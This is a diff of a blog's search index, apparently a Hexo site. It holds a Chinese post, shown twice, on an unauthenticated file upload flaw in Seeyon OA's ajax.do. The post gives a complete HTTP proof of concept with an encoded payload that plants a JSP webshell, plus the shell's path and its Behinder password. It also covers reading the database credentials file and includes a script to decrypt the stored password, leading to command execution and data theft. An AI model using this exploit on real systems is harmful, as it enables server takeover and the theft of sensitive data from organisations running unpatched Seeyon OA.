-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST /seeyon/autoinstall.do.css/..;/ajax.do?method=ajaxAction&amp;managerName=formulaManager&amp;requestCompress=gzip HTTP/1.1</span><br><span class="line">Host: 127.0.0.1</span><br><span class="line">Connection: close</span><br><span class="line">Cache-Control: max-age=0</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Opera/9.80 (Macintosh; Intel Mac OS X 10.6.8; U; fr) Presto/2.9.168 Version/11.52</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span><br><span class="line">Sec-Fetch-Site: none</span><br><span class="line">Sec-Fetch-Mode: navigate</span><br><span class="line">Sec-Fetch-User: ?1</span><br><span class="line">Sec-Fetch-Dest: document</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line">Cookie: JSESSIONID=7B6D8C106BD599DB0EF2F2E3B794A4FA; loginPageURL=; login_locale=zh_CN;</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 8819</span><br><span class="line"></span><br><span class="line">managerMethod=validate&amp;arguments=%1F%C2%8B%08%00%00%00%00%00%00%00uTK%C2%93%C2%A2H%10%3E%C3%AF%C3%BE%0A%C3%82%C2%8Bv%C3%B4%C2%8C%C2%8D+c%C2%BB%13%7Bh_%C2%88%28*%28%C2%AF%C2%8D%3D%40%15Ba%15%C2%B0%C3%B2%10%C3%AC%C2%98%C3%BF%C2%BE%05%C3%98%C3%93%3D%C2%B1%C2%BDu%C2%A9%C3%8C%C2%AC%C3%8C%C2%AF%C3%B2%C3%BD%C3%97k%C3%B7%14_H%C2%8E%C2%9DC%C2%95x%C3%9D%3F%C2%98%C3%81%17%C3%A6M%C2%A28%C2%A4%C2%96t3%2F%C3%8D%C2%BA%C3%AF%C3%A2y%C2%99%5C%C2%BC4EqT%3Fj%C3%99%05E%3E%C2%938Y%C3%80%C3%BC%C3%89t%C3%BA%C3%BD%C2%A7%C2%AB%C3%A7%3AI%C2%92%3E%C2%A5%C2%9EW%C3%85%C3%91S%C3%A7%C3%BB%C3%AFL%7B%7E%0B%C2%9D%C3%82%C3%A9%C2%A3%C2%B8%C2%BF%C2%A3%26%C2%99qA%C2%99wa%C2%92w%C2%9A%C2%A3%00%C2%91we%3EQ%C3%AB%C3%95%C3%B8%C2%8F%1D%C2%AD%C2%81%3C%26%C3%90%C3%89%C2%BCA%3FL%C2%93%C2%B2%C3%B3%C3%B0%13%C2%9E%C2%B9%C2%BB%C2%92%06%1E%C3%86%C2%B5%2F%3B1%C2%B9%C2%81YR%C2%B9%C3%9C%C2%98%C2%95%C2%96A%C3%A6%C2%8A%C3%82mKj%19%C2%8B%C2%9C%C2%A5%C3%8A%C2%82Y%5C%C2%AC%C2%B9%24%C2%80d%C2%9E%03%5E%C3%8F%C3%97D%29%5Cm%2C%1F%07%2F%C3%85Q%5CD%C2%B6%26%C3%B9%C2%90%C3%A8%15%C3%A0p%C3%A1%C2%86%2C%C3%9Ah%C3%83J%0A%C2%87%C3%8FN%C2%A4%5C%C2%B7DM%00%C3%91C%28b%C3%8E%C3%96%C2%84%C2%ABe%40%2C%C2%898%03%C3%A2%C2%B8%C2%825%3EYp%C2%96%26%0C%C3%A8%7B%C2%BAFq%C3%9A%C3%B0%C2%A6%C2%9F%5B%C3%BCJ%00K%C2%B5%C3%B8TFqmc%C2%93%C3%8BH*va%C3%B9%0F%C3%A0_%C2%BE%C3%99%C2%A2%1E%C2%BA%C3%A2%C2%A2%C2%B2L5q%C2%B9%C3%A1%C2%A3%24*%C2%A9e*7iq%C3%B4m3%60mC8%C2%83j2%C2%A3%3A7%C3%80%C2%96%C2%85e%C2%A8%18D%C2%99.%C3%8F%5B%C2%BD%C2%838%0E%28F%25%C2%89%C2%9B%C3%84%C3%A3%C2%95%01%C2%A0%C2%B4L%C3%A9-%3F%C2%B8Bc%C2%95%3A%C3%86%C3%86%C3%9Fse%00%C3%B8%C2%8DoW%01%C3%B2L%15K%C2%8B%0CZ%08%C2%8Fh%7C%2C4W%C2%B9%C2%B4l%C3%AD%C3%96D%C3%856%C3%81%C2%B9%7Dl%C2%B1eQJ7%C3%93%12%C2%ADI%C2%89%5D%02Ygz%1E%C2%9DL%C3%B6%C2%99%C3%A6%C2%B4%C3%8E%C3%BB%C3%996j%C2%BDU%40s%40%C3%B3w%C3%8F%5B%C2%A4%C2%84%C2%80%C3%A0%2B%14K%0Cg%C3%82%01.W%C2%89K%C2%80%C3%AF%C3%9CXd%1F%C3%B6%03%C3%BB%C2%B0%C2%A9%C2%B6%C2%86%C2%8D%C2%ADP%3Fo%0F%C3%92%C3%80B%C3%92%08p%C3%BA%C2%AD%C2%A9%01%12%C2%AE%C3%90T%0D%C3%8B%28%07%C2%B6%C3%A6%23%C2%A8I%C2%A9S%C2%9DG%7B%0E_%C2%9D6%C3%86%C3%B1%1B%C2%BD%26%10%C3%839%C2%A6uU%03%C2%97%28X%C2%9E%C2%AE%26%C2%AA%C2%BEA%C3%B2%21%0B%C3%974%06%C3%87%C3%9C%C3%87%1BT%C3%A6%C2%B6%09%C3%BC%23%C2%A7%C2%87u%C2%AC%1A%C2%A7%0BG%7E%C2%82%C2%AD%C3%8A%C2%8F%3F%C3%BC%19%C3%99%C2%BF%C3%BE%C2%99%C3%88%C2%95%C2%84d%C2%AD%C2%91O%C3%AB%7C%C2%81%C3%8AO%C3%96o%C3%B8%C3%9Ay%C3%A4%12%C2%9D%C2%A7%C3%B5%C2%89%C2%A1%18%24%C2%A0j%C3%B4%C3%9A%C3%BA%C3%94z%C2%8D_%C2%BF%C3%96F%C2%9E%C2%9E%C2%A9%1C%C3%84V%25%C2%9C%5D%C3%96%C2%A6%C3%B9X%C2%A4%C2%B2%28%60XMn%C3%90%18%C3%A6%C2%AE%C2%81o%C3%B4m%C2%BA%C3%97%C2%95%C2%85%12%C2%AAs%C2%9A%C3%97%C3%A2n%C2%977%C3%BD%C3%81%C2%A9x%1F%C3%A9%C3%84%C2%A6%C2%BD*%2FW%18%C2%98%3A%06%C3%BC%3E%C2%B79%C2%9D%3D%12%C3%BD%C3%AD%C2%8F%1C%C3%944%C2%9D%5E%C2%97%1Cc%C3%AAgBc%C2%A0%C3%B1%C3%83%C2%95%1B%29%C2%ACe%08%21%C2%8D%C2%8F%C3%BA%C2%A1%C2%97%C3%90X%C2%A4%C2%A0%0A%C2%9A%C2%9E%C3%9Es%C3%A3%1C%C2%8A%C3%BA%10%C3%92%C3%9A%C3%AE%C2%A6%C3%A3%C2%A6%27%01%C2%A7T%C2%8E9a%5DQgw%C3%A1%C2%B5h%C3%AB%C2%BA*%5C%7E%C3%BF%C3%B8%3E%C3%ADL%C2%9AG%7D%C2%82R%C3%90%C2%9F%C2%BCh%C3%B3o%C3%83%C2%99%07bH%07%1E%C3%9E%C3%AFv%C3%96%3FW%C3%AA%C3%BDw%C2%AA%5B%C2%B3%3B%C3%93%C3%9A%C2%B6L%C3%AF%0E%C3%98o%C3%AFI%7E%3AQ%C2%80f%09%3C%7C%C3%A9%1C%0F%C2%8B%C2%AF%C3%8F%1F%C2%97%C3%84%C3%87%7D%C3%93o%18%1C%C3%B5%3E%C2%82%C3%BF%C2%9F.%C3%80q%C3%AAQ%C3%87%7E%7C%C2%AF%C3%B7%21%25%C2%A0wb%C3%92%C3%8C%C3%89%10%60%C3%8A%C2%B2%C3%AC%3D%C2%BCv%7F%C3%90%25I%17%C3%A5k%7Dg%C2%97%C3%9C%C3%AB%C3%BE%C3%BD%2FheA%C3%A4_%05%00%00</span><br></pre></td></tr></table></figure>
-
-<p>如果漏洞利用成功，回显如下界面</p>
-<p><img src="/article/%E8%87%B4%E8%BF%9COA-ajax-do%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/image-20240412214707896.png"></p>
-<p>利用失败的话回显如下，或者页面空白，警告等</p>
-<p><img src="/article/%E8%87%B4%E8%BF%9COA-ajax-do%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/image-20240412214945750.png"></p>
-<p><strong>利用成功后用冰蝎连接</strong> <a href="https://github.com/rebeyond/Behinder/releases">工具链接</a></p>
-<p>webshell路径</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/seeyon/SeeyonUpdate1.jspx</span><br></pre></td></tr></table></figure>
-
-<p>连接密码：rebeyond</p>
-<p><img src="/article/%E8%87%B4%E8%BF%9COA-ajax-do%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/image-20240412215119512.png"></p>
-<h2 id="利用方式"><a href="#利用方式" class="headerlink" title="利用方式"></a>利用方式</h2><p>连接上马后即可命令执行，同样我们可以进行数据库连接从而实现敏感信息泄露</p>
-<p>当然前提是知道连接数据库的密码 <a href="https://www.cmdhack.com/archives/212.html">参考文章</a></p>
-<p>致远OA数据库配置文件路径</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/opt/Seeyon/A8/base/conf/datasourceCtp.properties</span><br></pre></td></tr></table></figure>
-
-<p>访问可以找到密码</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mysql.backup.path=</span><br><span class="line">db.hibernateDialect=org.hibernate.dialect.SQLServerDialect</span><br><span class="line">ctpDataSource.username=sa</span><br><span class="line">workflow.dialect=SQLServer</span><br><span class="line">ctpDataSource.driverClassName=com.microsoft.sqlserver.jdbc.SQLServerDriver</span><br><span class="line">ctpDataSource.password=/1.0/UWJ0dHgxc2U=</span><br><span class="line">ctpDataSource.url=jdbc:sqlserver://127.0.0.1:1433;DatabaseName=seeyou2;maxStatements=0;SelectMethod=cursor</span><br><span class="line">mysql.path=</span><br><span class="line">ctpDataSource.maxCount=2000</span><br></pre></td></tr></table></figure>
-
-<p>不过这里的密码是经过加密的，<code>1.0</code>表示左偏移一位，对应解密成明文</p>
-<p>解密脚本如下</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#coding:utf-8</span><br><span class="line">import base64</span><br><span class="line"></span><br><span class="line">a=&quot;&quot;</span><br><span class="line">password = &quot;Ab123456&quot;</span><br><span class="line">for i in password:</span><br><span class="line">    a+= chr(ord(i) -1 )</span><br><span class="line"></span><br><span class="line">print a</span><br></pre></td></tr></table></figure>
-
-<p>得到密码后即可连接数据库造成敏感信息泄露</p>
-]]></content>
-      <categories>
-        <category>漏洞分析</category>
-      </categories>
   </entry>
   <entry>
     <title>记录kali如何挂梯子</title>
@@ -2938,5 +2992,52 @@
       <tags>
         <tag>NSSCTF</tag>
       </tags>
+  </entry>
+  <entry>
+    <title>致远OA-ajax.do任意文件上传漏洞</title>
+    <url>/article/%E8%87%B4%E8%BF%9COA-ajax-do%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E.html</url>
+    <content><![CDATA[<p>利用此漏洞来连接冰蝎，可用来命令执行或者数据库连接</p>
+<span id="more"></span>
+
+<h1 id="致远OA-ajax-do任意文件上传漏洞"><a href="#致远OA-ajax-do任意文件上传漏洞" class="headerlink" title="致远OA-ajax.do任意文件上传漏洞"></a>致远OA-ajax.do任意文件上传漏洞</h1><h2 id="漏洞原因"><a href="#漏洞原因" class="headerlink" title="漏洞原因"></a>漏洞原因</h2><blockquote>
+<p>致远OA旧版本中某些接口存在未授权访问，以及部分函数过滤不足，攻击者通过构造恶意请求，可在无需登录的情况下上传恶意脚本，从而控制服务器</p>
+</blockquote>
+<h2 id="漏洞影响范围"><a href="#漏洞影响范围" class="headerlink" title="漏洞影响范围"></a>漏洞影响范围</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">致远OA V8.0</span><br><span class="line">致远OA V7.1、V7.1SP1</span><br><span class="line">致远OA V7.0、V7.0SP1、V7.0SP2、V7.0SP3</span><br><span class="line">致远OA V6.0、V6.1SP1、V6.1SP2</span><br><span class="line">致远OA V5.x</span><br><span class="line">致远OA G6</span><br></pre></td></tr></table></figure>
+
+<h2 id="执行过程"><a href="#执行过程" class="headerlink" title="执行过程"></a>执行过程</h2><p>首先验证漏洞是否存在，访问如下url</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/seeyon/thirdpartyController.do.css/..;/ajax.do</span><br></pre></td></tr></table></figure>
+
+<p>如果出现异常页面，则漏洞可能存在</p>
+<p><img src="/article/%E8%87%B4%E8%BF%9COA-ajax-do%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/image-20240412214529204.png"></p>
+<p>POC如下</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST /seeyon/autoinstall.do.css/..;/ajax.do?method=ajaxAction&amp;managerName=formulaManager&amp;requestCompress=gzip HTTP/1.1</span><br><span class="line">Host: 127.0.0.1</span><br><span class="line">Connection: close</span><br><span class="line">Cache-Control: max-age=0</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Opera/9.80 (Macintosh; Intel Mac OS X 10.6.8; U; fr) Presto/2.9.168 Version/11.52</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span><br><span class="line">Sec-Fetch-Site: none</span><br><span class="line">Sec-Fetch-Mode: navigate</span><br><span class="line">Sec-Fetch-User: ?1</span><br><span class="line">Sec-Fetch-Dest: document</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line">Cookie: JSESSIONID=7B6D8C106BD599DB0EF2F2E3B794A4FA; loginPageURL=; login_locale=zh_CN;</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 8819</span><br><span class="line"></span><br><span class="line">managerMethod=validate&amp;arguments=%1F%C2%8B%08%00%00%00%00%00%00%00uTK%C2%93%C2%A2H%10%3E%C3%AF%C3%BE%0A%C3%82%C2%8Bv%C3%B4%C2%8C%C2%8D+c%C2%BB%13%7Bh_%C2%88%28*%28%C2%AF%C2%8D%3D%40%15Ba%15%C2%B0%C3%B2%10%C3%AC%C2%98%C3%BF%C2%BE%05%C3%98%C3%93%3D%C2%B1%C2%BDu%C2%A9%C3%8C%C2%AC%C3%8C%C2%AF%C3%B2%C3%BD%C3%97k%C3%B7%14_H%C2%8E%C2%9DC%C2%95x%C3%9D%3F%C2%98%C3%81%17%C3%A6M%C2%A28%C2%A4%C2%96t3%2F%C3%8D%C2%BA%C3%AF%C3%A2y%C2%99%5C%C2%BC4EqT%3Fj%C3%99%05E%3E%C2%938Y%C3%80%C3%BC%C3%89t%C3%BA%C3%BD%C2%A7%C2%AB%C3%A7%3AI%C2%92%3E%C2%A5%C2%9EW%C3%85%C3%91S%C3%A7%C3%BB%C3%AFL%7B%7E%0B%C2%9D%C3%82%C3%A9%C2%A3%C2%B8%C2%BF%C2%A3%26%C2%99qA%C2%99wa%C2%92w%C2%9A%C2%A3%00%C2%91we%3EQ%C3%AB%C3%95%C3%B8%C2%8F%1D%C2%AD%C2%81%3C%26%C3%90%C3%89%C2%BCA%3FL%C2%93%C2%B2%C3%B3%C3%B0%13%C2%9E%C2%B9%C2%BB%C2%92%06%1E%C3%86%C2%B5%2F%3B1%C2%B9%C2%81YR%C2%B9%C3%9C%C2%98%C2%95%C2%96A%C3%A6%C2%8A%C3%82mKj%19%C2%8B%C2%9C%C2%A5%C3%8A%C2%82Y%5C%C2%AC%C2%B9%24%C2%80d%C2%9E%03%5E%C3%8F%C3%97D%29%5Cm%2C%1F%07%2F%C3%85Q%5CD%C2%B6%26%C3%B9%C2%90%C3%A8%15%C3%A0p%C3%A1%C2%86%2C%C3%9Ah%C3%83J%0A%C2%87%C3%8FN%C2%A4%5C%C2%B7DM%00%C3%91C%28b%C3%8E%C3%96%C2%84%C2%ABe%40%2C%C2%898%03%C3%A2%C2%B8%C2%825%3EYp%C2%96%26%0C%C3%A8%7B%C2%BAFq%C3%9A%C3%B0%C2%A6%C2%9F%5B%C3%BCJ%00K%C2%B5%C3%B8TFqmc%C2%93%C3%8BH*va%C3%B9%0F%C3%A0_%C2%BE%C3%99%C2%A2%1E%C2%BA%C3%A2%C2%A2%C2%B2L5q%C2%B9%C3%A1%C2%A3%24*%C2%A9e*7iq%C3%B4m3%60mC8%C2%83j2%C2%A3%3A7%C3%80%C2%96%C2%85e%C2%A8%18D%C2%99.%C3%8F%5B%C2%BD%C2%838%0E%28F%25%C2%89%C2%9B%C3%84%C3%A3%C2%95%01%C2%A0%C2%B4L%C3%A9-%3F%C2%B8Bc%C2%95%3A%C3%86%C3%86%C3%9Fse%00%C3%B8%C2%8DoW%01%C3%B2L%15K%C2%8B%0CZ%08%C2%8Fh%7C%2C4W%C2%B9%C2%B4l%C3%AD%C3%96D%C3%856%C3%81%C2%B9%7Dl%C2%B1eQJ7%C3%93%12%C2%ADI%C2%89%5D%02Ygz%1E%C2%9DL%C3%B6%C2%99%C3%A6%C2%B4%C3%8E%C3%BB%C3%996j%C2%BDU%40s%40%C3%B3w%C3%8F%5B%C2%A4%C2%84%C2%80%C3%A0%2B%14K%0Cg%C3%82%01.W%C2%89K%C2%80%C3%AF%C3%9CXd%1F%C3%B6%03%C3%BB%C2%B0%C2%A9%C2%B6%C2%86%C2%8D%C2%ADP%3Fo%0F%C3%92%C3%80B%C3%92%08p%C3%BA%C2%AD%C2%A9%01%12%C2%AE%C3%90T%0D%C3%8B%28%07%C2%B6%C3%A6%23%C2%A8I%C2%A9S%C2%9DG%7B%0E_%C2%9D6%C3%86%C3%B1%1B%C2%BD%26%10%C3%839%C2%A6uU%03%C2%97%28X%C2%9E%C2%AE%26%C2%AA%C2%BEA%C3%B2%21%0B%C3%974%06%C3%87%C3%9C%C3%87%1BT%C3%A6%C2%B6%09%C3%BC%23%C2%A7%C2%87u%C2%AC%1A%C2%A7%0BG%7E%C2%82%C2%AD%C3%8A%C2%8F%3F%C3%BC%19%C3%99%C2%BF%C3%BE%C2%99%C3%88%C2%95%C2%84d%C2%AD%C2%91O%C3%AB%7C%C2%81%C3%8AO%C3%96o%C3%B8%C3%9Ay%C3%A4%12%C2%9D%C2%A7%C3%B5%C2%89%C2%A1%18%24%C2%A0j%C3%B4%C3%9A%C3%BA%C3%94z%C2%8D_%C2%BF%C3%96F%C2%9E%C2%9E%C2%A9%1C%C3%84V%25%C2%9C%5D%C3%96%C2%A6%C3%B9X%C2%A4%C2%B2%28%60XMn%C3%90%18%C3%A6%C2%AE%C2%81o%C3%B4m%C2%BA%C3%97%C2%95%C2%85%12%C2%AAs%C2%9A%C3%97%C3%A2n%C2%977%C3%BD%C3%81%C2%A9x%1F%C3%A9%C3%84%C2%A6%C2%BD*%2FW%18%C2%98%3A%06%C3%BC%3E%C2%B79%C2%9D%3D%12%C3%BD%C3%AD%C2%8F%1C%C3%944%C2%9D%5E%C2%97%1Cc%C3%AAgBc%C2%A0%C3%B1%C3%83%C2%95%1B%29%C2%ACe%08%21%C2%8D%C2%8F%C3%BA%C2%A1%C2%97%C3%90X%C2%A4%C2%A0%0A%C2%9A%C2%9E%C3%9Es%C3%A3%1C%C2%8A%C3%BA%10%C3%92%C3%9A%C3%AE%C2%A6%C3%A3%C2%A6%27%01%C2%A7T%C2%8E9a%5DQgw%C3%A1%C2%B5h%C3%AB%C2%BA*%5C%7E%C3%BF%C3%B8%3E%C3%ADL%C2%9AG%7D%C2%82R%C3%90%C2%9F%C2%BCh%C3%B3o%C3%83%C2%99%07bH%07%1E%C3%9E%C3%AFv%C3%96%3FW%C3%AA%C3%BDw%C2%AA%5B%C2%B3%3B%C3%93%C3%9A%C2%B6L%C3%AF%0E%C3%98o%C3%AFI%7E%3AQ%C2%80f%09%3C%7C%C3%A9%1C%0F%C2%8B%C2%AF%C3%8F%1F%C2%97%C3%84%C3%87%7D%C3%93o%18%1C%C3%B5%3E%C2%82%C3%BF%C2%9F.%C3%80q%C3%AAQ%C3%87%7E%7C%C2%AF%C3%B7%21%25%C2%A0wb%C3%92%C3%8C%C3%89%10%60%C3%8A%C2%B2%C3%AC%3D%C2%BCv%7F%C3%90%25I%17%C3%A5k%7Dg%C2%97%C3%9C%C3%AB%C3%BE%C3%BD%2FheA%C3%A4_%05%00%00</span><br></pre></td></tr></table></figure>
+
+<p>如果漏洞利用成功，回显如下界面</p>
+<p><img src="/article/%E8%87%B4%E8%BF%9COA-ajax-do%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/image-20240412214707896.png"></p>
+<p>利用失败的话回显如下，或者页面空白，警告等</p>
+<p><img src="/article/%E8%87%B4%E8%BF%9COA-ajax-do%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/image-20240412214945750.png"></p>
+<p><strong>利用成功后用冰蝎连接</strong> <a href="https://github.com/rebeyond/Behinder/releases">工具链接</a></p>
+<p>webshell路径</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/seeyon/SeeyonUpdate1.jspx</span><br></pre></td></tr></table></figure>
+
+<p>连接密码：rebeyond</p>
+<p><img src="/article/%E8%87%B4%E8%BF%9COA-ajax-do%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/image-20240412215119512.png"></p>
+<h2 id="利用方式"><a href="#利用方式" class="headerlink" title="利用方式"></a>利用方式</h2><p>连接上马后即可命令执行，同样我们可以进行数据库连接从而实现敏感信息泄露</p>
+<p>当然前提是知道连接数据库的密码 <a href="https://www.cmdhack.com/archives/212.html">参考文章</a></p>
+<p>致远OA数据库配置文件路径</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/opt/Seeyon/A8/base/conf/datasourceCtp.properties</span><br></pre></td></tr></table></figure>
+
+<p>访问可以找到密码</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mysql.backup.path=</span><br><span class="line">db.hibernateDialect=org.hibernate.dialect.SQLServerDialect</span><br><span class="line">ctpDataSource.username=sa</span><br><span class="line">workflow.dialect=SQLServer</span><br><span class="line">ctpDataSource.driverClassName=com.microsoft.sqlserver.jdbc.SQLServerDriver</span><br><span class="line">ctpDataSource.password=/1.0/UWJ0dHgxc2U=</span><br><span class="line">ctpDataSource.url=jdbc:sqlserver://127.0.0.1:1433;DatabaseName=seeyou2;maxStatements=0;SelectMethod=cursor</span><br><span class="line">mysql.path=</span><br><span class="line">ctpDataSource.maxCount=2000</span><br></pre></td></tr></table></figure>
+
+<p>不过这里的密码是经过加密的，<code>1.0</code>表示左偏移一位，对应解密成明文</p>
+<p>解密脚本如下</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#coding:utf-8</span><br><span class="line">import base64</span><br><span class="line"></span><br><span class="line">a=&quot;&quot;</span><br><span class="line">password = &quot;Ab123456&quot;</span><br><span class="line">for i in password:</span><br><span class="line">    a+= chr(ord(i) -1 )</span><br><span class="line"></span><br><span class="line">print a</span><br></pre></td></tr></table></figure>
+
+<p>得到密码后即可连接数据库造成敏感信息泄露</p>
+]]></content>
+      <categories>
+        <category>漏洞分析</category>
+      </categories>
   </entry>
 </search>
